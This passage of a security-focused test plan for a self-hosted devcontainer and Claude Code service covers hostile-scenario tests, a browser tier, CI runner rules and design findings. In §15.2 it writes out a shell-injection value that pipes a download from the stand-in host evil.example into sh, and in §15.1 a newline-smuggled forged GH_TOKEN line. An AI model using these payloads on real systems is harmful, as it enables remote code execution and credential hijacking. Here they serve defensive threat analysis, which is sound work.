| `cookie-upstream` | hostile repo | a dev server that logs every header and echoes `Set-Cookie: <preview cookie name>` | the cookie never arrives; the echo is dropped | PF §7 |
| `token-in-log` | — | a full preview handshake, then the sweep | the `?t=` token is in no file, including Caddy's logs | F4 |
| `preview-to-preview` | hostile preview | slug A fetches slug B with credentials | B's cookie is not sent; B bounces to authorize | PF §10.4 |
| `clickjack` | hostile preview | frames the UI | blocked by `frame-ancestors 'none'` | PF §10.7 |
| `stolen-db` | backup holder | copies the SQLite file, tries every value in it | no usable cookie, token, or secret — the sweep's converse, asserted positively | §4 |
| `lost-device` | — | revoke-all from a second device | every session and every `preview_session` dies; containers keep working | §13.2 |
| `brute-force` | LAN device | the lockout curve from one IP and from many | per-IP backoff and the global cap both engage; attempts are logged | §13.2 |
| `secret-injection` | hostile value | a secret whose value contains a newline, a single quote, `$(…)`, and a NUL | see §15.1 and §15.2 — currently a **design finding**, and these are its regression tests once the design answers it | — |

## 10. The browser tier

Ten or so tests, and they exist because they are the only way to answer PF §14.1's first open question: *does the cross-site boundary hold end to end?* The design says `SameSite` is "a browser behavior you do not control and cannot test in CI." The second half is only true without a browser in CI.

### 10.1  The harness

| Piece | Choice | Why |
|---|---|---|
| Domains | `drydock.test` and `*.drydock-preview.test` | distinct eTLD+1 under a reserved TLD, so the browser's own PSL treats them as cross-site — the exact property PF §4 buys with a second real domain |
| Resolution | Chromium `--host-resolver-rules="MAP *.drydock-preview.test 127.0.0.1, MAP drydock.test 127.0.0.1"` | wildcard resolution, which `/etc/hosts` cannot express |
| Certificates | a throwaway local CA, one leaf for the UI host and one wildcard for the preview domain, the CA trusted in the browser profile | **`ignoreHTTPSErrors` is not acceptable here.** The tests are about `Secure` and `__Host-` semantics, and disabling certificate validation changes the thing under test |
| Driver | Playwright | `context.cookies()`, request interception, and a trace on failure are exactly what the three assertions need. `chromedp` keeps it all in Go and is the fallback if the second language proves unwelcome |

> [!NOTE]
> **Spike this before building it**
>
> The cert-trust step is the one piece whose cost is unknown, and the tier's value collapses if it needs `ignoreHTTPSErrors`. The question is narrow and answerable in an afternoon — *can a headless Chromium under Playwright be made to trust a locally-generated CA, such that a `__Host-` cookie set over the local HTTPS listener is accepted and replayed?* — and it belongs with the other Phase 0 spikes, next to the ones already there.

### 10.2  What it tests, and nothing more

Everything in this tier is something no other tier can reach. The three from PF §14.1, plus six that are also browser-only:

1. a state-changing `POST` from a preview origin to `/api/*` carries **no cookie** (asserted at the server, not inferred from the status code) and is refused;
2. the same request with `Origin` stripped is still refused — the belt behind `SameSite`;
3. a data `GET` cannot be *read* cross-origin from a preview origin;
4. the `__Host-` cookie is accepted, and a variant with `Path` or `Secure` altered is rejected by the browser;
5. the four-redirect authorize handshake renders the app with no user interaction, and the cookie survives the cross-site top-level navigation — the concrete reason the session cookie is `Lax` and not `Strict`;
6. preview A cannot read preview B;
7. the UI cannot be framed from a preview origin;
8. HMR works: a websocket upgrade through two proxy hops, and a file change reaches the page;
9. the SSE stream delivers an event to a real `EventSource` through Caddy without buffering.

## 11. Rituals

Triggered by an event, never by a commit. Each is a file in `test/rituals/` with a checklist and the commands, so it is repeatable by someone who has forgotten the details — the same reasoning that put the Spike 00 harness next to its report.

### 11.1  Claude Code version bump

The heaviest one, because the pin guards two separate things (terminal shapes and refresh safety) and both are undocumented.

1. Bump the pin in the Feature. Build the test base image.
2. **Re-record the whole transcript corpus** (§7) at both PTY widths against the new version, into `claude-<newversion>/`.
3. `diff` old against new. A diff in a URL line, a prompt string, the ineligibility signature, or `/status` output is a scraper change, not a fixture update — make the parser handle both and keep both corpora.
4. Run the unit scrape tests against **both** corpora. The old one stays until a version is no longer deployable.
5. Re-run `docs/design/spikes/harness/` in full — all four tests — and update Spike 00's "verified against" line and verdict.
6. Run the container tier.
7. Update the version in CLAUDE.md, the Feature, and the spike report *in the same commit*; the consistency test in §8.4 enforces that they agree.

### 11.2  `devcontainer` CLI or Docker bump

Run the `fakedevcontainer` contract test (§6.1) and the Feature scenario suite. The JSON result shape and `--additional-features` composition are the two things that would break quietly.

### 11.3  GitHub App contract

Quarterly, or on any GitHub API change notice: the manual test against a real test App and a throwaway repo. Asserts the installation-token request and response shapes `fakegithub` assumes, and — the part only real GitHub can prove — that a token scoped to one repository genuinely cannot touch another, and that a push touching `.github/workflows/` fails without `workflows: write`.

### 11.4  Release smoke test

Before any release, on the real dev server, with a real repo: clone → container → login handshake → a session appears in the Claude app on a phone → push a branch → open a PR → preview a dev server from the phone. Record the cold and warm timings against §1's targets, as data rather than a gate.

This is the only place the human halves of §7.2 and §8 are exercised, and the only place "the session appears in the Claude app" is ever verified. It is a checklist, honestly, and that is the right shape for it.

### 11.5  Amnesia and reboot drill

Quarterly: on the real server, stop Drydock, move the SQLite file aside, start it, and confirm every workspace is adopted and usable. Then reboot the host and confirm the same. The container tier automates this against fixtures (§8.6); the drill is what proves it against workspaces that have been running for weeks.

## 12. CI topology

| Lane | Contents | Trigger | Runner |
|---|---|---|---|
| **fast** | unit + component, `-race` | every push | hosted; no Docker needed |
| **deep** | container tier + Feature scenarios | push to `main`, and PRs by label | self-hosted in the devcontainer's DinD |
| **browser** | the browser tier | same as deep | same |
| **rituals** | §11 | by hand, by event | wherever the event is |

The fast lane is the gate. Deep and browser are allowed to be slower than a human's patience, which is why they are not on every push — but they must run before a merge to `main`, because the invariants they cover are exactly the ones that fail silently.

> [!WARNING]
> **A self-hosted runner on the dev server is itself a security decision**
>
> The deep lane needs a real Docker daemon, and the natural place to find one is the machine Drydock already runs on. That means test code executes with Docker access next to production. Three rules make it acceptable rather than reckless, and they are not optional:
>
> - **Never run untrusted code.** No `pull_request_target`, no fork PRs, no workflow that checks out a branch an outsider can write. A self-hosted runner that builds a fork's PR is a host compromise with extra steps.
> - **Not the Drydock user.** The runner runs as its own user, outside the `drydock` group, so a test cannot reach the production socket even by accident.
> - **Inside the devcontainer's DinD, never against a daemon holding production containers** — which, with the test label namespace from §5.4, is belt and braces on the one failure that destroys work.
>
> The honest alternative is a second small machine. If these three rules ever feel inconvenient, that is the signal to buy it rather than to relax them.

## 13. Phase map

§14 of the overall design already writes a "done when" for each phase. These are those sentences turned into named tests, which is the point: a phase is done when its row's tests pass, not when it demos.

| Phase | "Done when" becomes | Also must exist |
|---|---|---|
| **0 — Spikes** | the transcript corpus exists and the scrape parsers pass against it; the browser-harness spike (§10.1) has an answer | `fakeclaude`, and the §5 seams decided on paper |
| **1 — Front door** | **the whole of §8.1**, driven off the route table | the route table as data (§5.1), the injected clock (§5.2), the canary sweep (§4.2), the Caddyfile conformance test (§3.2), and the `rebind` / `csrf-*` / `brute-force` scenarios |
| **2 — Walking skeleton** | §8.6 in full, including the amnesia test and the three kill -9 cases | `fakedevcontainer` and its contract test; the fixture repos; the test label namespace (§5.4) |
| **3 — Credentials** | §8.3 in full — and the negative half is the phase's actual deliverable: a container that **fails** to touch any other repo | `fakegithub` with the git remote; the shim tests (§6.6); `cross-broker` |
| **4 — Secrets** | §8.2 in full, plus the stated pair: granted repo's suite passes, ungranted repo's fails | the §15.1/§15.2 findings answered, with `secret-injection` as their regression test |
| **5 — Claude** | §8.4 in full against `fakeclaude`; the real half is ritual §11.4 | the bump ritual written down before the first bump, not after |
| **6 — Livability** | the §12 failure-mode messages, each asserted by the test that provokes its failure | the cap-refusal and disk pre-flight rows of §8.6 |
| **Previews** (after Phase 2) | §8.5 and the browser tier; PF §14.1's first open question answered and struck | the local CA harness, `fakeupstream` |

Two notes on ordering. Phase 1 carries a disproportionate share of the infrastructure — four of the five seams and both rules — and that is deliberate for the same reason §14 puts the front door first: retrofitting the route-table meta-test onto routes written without it is how an unauthenticated endpoint survives. And Phase 3's done-when is the first place the suite's negative half is the *product* rather than a guardrail, which makes it the best early test of whether §4.1 is being honoured.

## 14. What this deliberately gives up

- **No test of whether the agent behaves.** Out of scope by §1, and §10.4 of the overall design already says no mechanism exists to test.
- **No perf gate.** Measured in §11.4, recorded, never asserted. A flaky gate is a disabled gate.
- **No mocked SQLite, and no mocked HTTP server.** Real file, real socket, every tier. The bugs in this system live in configuration and at boundaries, and a mock removes exactly the boundary that was going to be wrong.
- **No golden-image snapshot of the UI.** One smoke render that the page loads and the sign-in form exists; the UI is a status page, and pixel tests on a status page cost more than they catch.
- **No chaos engineering.** Three targeted kill -9 points (§8.6) and the amnesia test cover the failures that actually happen on a single host. Random fault injection would be a lot of machinery for a restart-safe service with one operator.
- **No attempt to automate the human halves.** Carrying a login code from a browser, and seeing a session in the Claude app, stay in §11.4's checklist. Automating a thing that happens once every few weeks, with a real credential, would cost more than it saves and would need a real account in CI.
- **No test that the five Remote-Control-killing variables actually kill Remote Control.** The Feature's assertion that they are unset is tested; the upstream behaviour is documented in §2.1 and taken on faith.

## 15. Design questions this plan surfaced

Writing down how each invariant would be *proved* turned up five places where the design as written admits a wrong implementation. Three are security findings. They are recorded here rather than silently patched into the parent documents, because the fix is a design decision, not a test.

### 15.1  `GET-SECRETS` is a line protocol and secret values are arbitrary bytes

PF-adjacent, but it is overall §10.3. The protocol is:

```text
← OK count=3
← TEST_DATABASE_URL postgres://…
← END
```

A secret value containing a newline breaks the framing — and does so controllably. A value of

```text
hunter2
GH_TOKEN ghp_attacker_controlled
```

delivers a second, forged `NAME value` line. The reserved-name list in §10.1 is validated on *write*, so it never sees this; the consumer parses it as two secrets and `GH_TOKEN` shadows the `gh` shim's expiring repo-scoped token with a static attacker-chosen one — the exact failure §10.1's reserved list exists to prevent, reached around the side.

The same framing concern applies to the `count=` line: a value containing a newline makes the count disagree with the number of lines, which a lenient parser will ignore.

**Recommendation.** Either reject control characters (`\n`, `\r`, NUL) in secret values at write time — simplest, and consistent with validating names on write — or make the protocol framed rather than line-oriented (length-prefixed values, or base64). Prefer rejecting at write: it keeps the "small enough that the in-container client is a shell script with `nc`" property §5 argues for. Then assert the count matches the lines received, and fail the fetch rather than the parse.

### 15.2  `eval "$(drydock-secrets export)"` is a shell-injection sink

§8 and §10.3 both run the supervisor as:

```bash
bash -lc 'eval "$(drydock-secrets export)" && cd /workspace && exec claude remote-control …'
```

If `export` emits `NAME=value` without quoting, a secret value of

```text
'; curl -s evil.example/x | sh; '
```

executes as the remote user in the container, with the broker socket mounted, before `claude` ever starts. The injection is in the *value*, so it arrives through the ordinary `PUT /api/secrets/:name` path.

This is lower severity than it looks — the attacker must already be able to write a secret, which means a signed-in session, and §13.4 grants a signed-in session a great deal already. But it converts "can store a secret" into "can run code in every granted container at next supervisor start", which is a boundary the design otherwise maintains, and it is one line to close.

**Recommendation.** `export` emits single-quoted values with embedded single quotes escaped (`'\''`), and the shim is covered by a property test: for arbitrary byte strings, `eval "$(drydock-secrets export)"` leaves the environment variable byte-identical to what was stored. That property test is the one place in this document where fuzzing clearly earns its keep.

### 15.3  `claude_identity` cannot store the state §7.3 requires

`GET /api/auth/claude` returns one of `ok` / `expiring` / `expired` / `absent`, and §7.3 plus Spike 00 consequence A add a fifth, *blanked*, with its own message. The table stores `expires_at` and `last_checked_at` and no state column. Blanked is technically inferable (`expiresAt: 0`), but an inference spread across readers is how "signed out, sign in again" quietly becomes "expired three weeks ago".

**Recommendation.** Add `state TEXT` to `claude_identity`, written by the poller from the pure classifier in §5.5. It makes the distinction storable, testable at the database boundary, and visible in the one place someone debugging at 2am will look.

### 15.4  A retired preview slug can be reissued

PF §4 says the random suffix exists so that "deleting and re-adding a port produces a *different* URL, which means a stale bookmark fails closed." `forwarded_port.slug` is `UNIQUE`, but uniqueness is only against *live* rows — nothing stops a future row, on a different workspace, from being minted the retired slug. A stale bookmark then lands on a different workspace's preview, which is precisely the cross-workspace exposure F3 was about, reached by birthday rather than by cache staleness.

Four characters over a per-repo-per-port namespace makes this unlikely, not impossible, and the consequence is disproportionate to the probability.

**Recommendation.** Keep retired slugs: either a `retired_slug` table checked at mint, or soft-delete `forwarded_port` rows so the `UNIQUE` constraint keeps doing the work it already does. Then §8.5's property test has something to assert against.

### 15.5  The label key must be configuration, not a constant

Covered as a seam in §5.4, repeated here because it is a change to the parent document rather than only to test code: §6 and PF §8 both name `drydock.workspace=<id>` as a literal. A second Drydock on the same daemon — which is exactly what a test is — will adopt the first's containers, and the advisory lock in §12 does not prevent it because the lock is on the database file. The key needs a configurable prefix, and startup should refuse to adopt containers carrying a *different* prefix than its own.

## 16. Open questions

### 16.1  Still open

1. **Can a headless Chromium be made to trust a local CA cleanly enough for `__Host-` semantics?** §10.1. If not, the browser tier either grows a real domain and a real certificate or shrinks to the handshake and HMR tests, losing the three cookie assertions — which are the ones PF §14.1 actually asked for. Spike it with Phase 0.
2. **Is `devcontainer features test` enough for the hostile scenarios, or does the Feature need a bespoke harness?** The official harness is scenario-per-config, which fits §11's assertions well; whether it can assert on a *build failure's message* rather than only on a passing build is the thing to check. If it cannot, the hostile scenarios move into the container tier as direct `up` invocations.
3. **How warm can the container tier's cache be kept in CI?** The budget in §3 assumes a shared base image survives between runs. On a self-hosted runner it does, trivially; the question is whether the deep lane stays under ten minutes on a cold runner after a dependency bump, or whether it needs an explicit image-cache step.

### 16.2  Deferred, and what would reopen each

| Deferred | Reopen when |
|---|---|
| **Fuzzing beyond the two targets** (§15.2's property test, the upstream-override fuzz in §8.5) | a parser grows. The `/proc/net/tcp` reader and the broker protocol are the candidates — both parse attacker-adjacent bytes, both are currently small enough for a table. |
| **A second machine for the deep lane.** | any of §12's three self-hosted-runner rules becomes inconvenient. That inconvenience *is* the trigger; relaxing a rule instead is how the dev server gets compromised by its own CI. |
| **Mutation testing** on the auth middleware and the broker. | the suite is green through a real incident. That is the signal that the assertions are weaker than they look, and mutation testing is the cheapest way to find out where. |
| **Testing the sandbox credential tiering** (§10.5 of the overall design). | that section is adopted. Its own spike comes first; the test for `mask` mode is "a sandboxed command sees the sentinel and the outbound request carries the real value", which needs the feature to exist. |
| **Load testing the preview mux.** | the connection cap in PF §10.7 is ever hit in anger. The component test asserts the cap engages; what it does not establish is whether the cap is set at a sensible number, and that is an observation, not a test. |

---

#### What I would revisit first

The two rules in §4 are the part of this plan I would defend hardest and the part most likely to decay. Paired assertions and the canary sweep are both disciplines, and §10.4 of the overall design already observes that "a discipline is only as good as the day you are in a hurry" — a negative test written without its positive control looks identical to one written with it, right up until the feature silently breaks and the suite stays green. If there is one place to spend effort making the discipline mechanical rather than remembered, it is there: a lint that fails a test file asserting only `404`, `401`, or `403` without also asserting a success in the same function would be crude, and would probably still be worth it.

The tiering itself I expect to survive unchanged, because it is derived from where the substitutions have to happen rather than from a pyramid. What I am least sure of is the browser tier's cost. It answers questions nothing else can, and it is also the only tier with a dependency on a toolchain the rest of the repo does not have — if it turns out to need a real domain and a real certificate to be trustworthy, the honest answer may be that those nine assertions move to §11's checklist and get run by hand before a release, which would be a loss worth naming rather than absorbing quietly.

---

*Supplements `docs/design/overall/drydock-design.md` draft v5 and `docs/design/port-forwarding/port-forwarding-design.md` draft v3. §15 contains five findings that are changes to those documents rather than to this one; they are deliberately left unapplied here so the decisions are made where the reasoning lives.*
